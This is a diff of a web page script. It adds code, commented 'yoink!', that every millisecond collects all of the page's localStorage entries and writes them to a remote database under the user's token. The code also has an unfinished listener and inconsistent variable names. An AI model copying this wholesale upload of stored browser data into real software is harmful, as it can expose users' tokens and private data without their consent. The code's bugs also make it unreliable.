@@ -36,4 +36,29 @@
       window.location.href = "index.html";
     }
   });
+
+  var start = false;
+  
+  // yoink!
+  setInterval(function(){
+    function getLocalStorageKeysAsJSON() {
+      const keys = {};
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        keys[key] = localStorage.getItem(key);
+      }
+      return JSON.stringify(keys);
+    }
+    const combinedJSON = getLocalStorageKeysAsJSON();
+    writeUserData(JSON.stringify(combinedJSON))
+  }, 1)
+  function writeUserData(save_data) {
+    set(ref(db, `users/${usertoken}/localstorageData`), save_data)
+  }
+  if (!start) {
+    onValue(ref(database, `users/${usertoken}/localstorageData`), (snapshot) => {
+      // finish later
+    });
+  }
+  
 </script>
